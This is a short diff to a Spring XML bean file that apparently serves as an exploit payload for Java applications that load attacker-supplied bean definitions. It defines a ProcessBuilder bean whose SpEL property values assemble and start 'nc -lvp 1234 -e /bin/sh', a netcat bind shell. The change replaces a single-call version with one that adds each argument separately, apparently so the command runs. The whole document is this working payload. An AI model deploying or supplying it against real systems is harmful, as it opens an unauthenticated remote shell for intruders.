@@ -5,6 +5,11 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <property name="whatever" value="#{ pb.command('nc -lvp 1234 -e /bin/sh').start() }"/>
+     <property name="whatever" value="#{ pb.add('nc') }"/>
+     <property name="whatever" value="#{ pb.add('-lvp') }"/>
+     <property name="whatever" value="#{ pb.add('1234') }"/>
+     <property name="whatever" value="#{ pb.add('-e') }"/>
+     <property name="whatever" value="#{ pb.add('/bin/sh') }"/>
+     <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
